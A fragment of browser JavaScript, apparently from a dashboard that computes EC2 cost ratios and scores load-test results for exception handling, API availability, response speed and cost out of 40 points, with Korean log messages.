  document.getElementById('costTotal').textContent = '$' + totalPerHour.toFixed(4) + '/hr';
  document.getElementById('costBase').textContent = '$' + baseCostPerHour.toFixed(4) + '/hr';
  document.getElementById('costRatio').textContent = ratio.toFixed(2);
  document.getElementById('costTotalHours').textContent = '$' + (totalPerHour * hours).toFixed(4) + ' (' + hours + '\uC2DC\uAC04)';

  window._costRatio = ratio;
  log('\uD83D\uDCB0 \uBE44\uC6A9: EC2=$' + ec2CostPerHour.toFixed(4) + '/hr, Ratio=' + ratio.toFixed(2));
}

// ===== Scoring =====
function calculateScore() {
  var score1 = 0, score2 = 0, score3 = 0, score4 = 0;

  var imgRate = stats.image.total ? (stats.image.success / stats.image.total) * 100 : 0;
  var excRate = stats.exception.total ? (stats.exception.success / stats.exception.total) * 100 : 0;

  if (imgRate >= 90) score1 += 2.0;
  else if (imgRate >= 85) score1 += 1.5;
  else if (imgRate >= 80) score1 += 1.0;
  else if (imgRate >= 50) score1 += 0.5;

  if (excRate >= 90) score1 += 2.0;
  else if (excRate >= 85) score1 += 1.5;
  else if (excRate >= 80) score1 += 1.0;
  else if (excRate >= 50) score1 += 0.5;

  var thresholds = [90, 87.5, 85, 82.5, 80, 70, 50, 30];
  var apiList = ['user', 'product', 'stress'];
  for (var a = 0; a < apiList.length; a++) {
    var avail = stats[apiList[a]].total ? (stats[apiList[a]].success / stats[apiList[a]].total) * 100 : 0;
    for (var t = 0; t < thresholds.length; t++) { if (avail >= thresholds[t]) score2 += 0.5; }
  }

  for (var a2 = 0; a2 < apiList.length; a2++) {
    var perf = stats[apiList[a2]].total ? (stats[apiList[a2]].fast / stats[apiList[a2]].total) * 100 : 0;
    for (var t2 = 0; t2 < thresholds.length; t2++) { if (perf >= thresholds[t2]) score3 += 0.5; }
  }

  if (!window._costRatio) calcCost();
  var finalRatio = window._costRatio || 0;

  var userPerf = stats.user.total ? (stats.user.fast / stats.user.total) * 100 : 0;
  var prodPerf = stats.product.total ? (stats.product.fast / stats.product.total) * 100 : 0;
  var stressPerf = stats.stress.total ? (stats.stress.fast / stats.stress.total) * 100 : 0;
  var perfGate = userPerf >= 30 && prodPerf >= 30 && stressPerf >= 30;

  if (perfGate && finalRatio >= 0.5) {
    var costThresholds = [1.00, 1.25, 1.50, 1.75, 2.00, 2.25, 2.50, 2.75, 3.00, 3.25, 3.50, 3.75];
    for (var c = 0; c < costThresholds.length; c++) { if (finalRatio <= costThresholds[c]) score4 += 1.0; }
  }

  document.getElementById('score1').textContent = score1.toFixed(1);
  document.getElementById('score2').textContent = score2.toFixed(1);
  document.getElementById('score3').textContent = score3.toFixed(1);
  document.getElementById('score4').textContent = score4.toFixed(1);
  document.getElementById('scoreTotal').textContent = (score1 + score2 + score3 + score4).toFixed(1);

  document.getElementById('score1').style.color = score1 >= 3 ? '#2ed573' : score1 >= 2 ? '#ffa502' : '#ff4757';
  document.getElementById('score2').style.color = score2 >= 9 ? '#2ed573' : score2 >= 6 ? '#ffa502' : '#ff4757';
  document.getElementById('score3').style.color = score3 >= 9 ? '#2ed573' : score3 >= 6 ? '#ffa502' : '#ff4757';
  document.getElementById('score4').style.color = score4 >= 9 ? '#2ed573' : score4 >= 6 ? '#ffa502' : '#ff4757';

  log('\uCC44\uC810 \uC644\uB8CC: \uBE44\uC815\uC0C1=' + score1 + ', \uAC00\uC6A9\uC131=' + score2 + ', \uC131\uB2A5=' + score3 + ', \uBE44\uC6A9=' + score4 + ', \uCD1D\uC810=' + (score1+score2+score3+score4).toFixed(1) + '/40');
}
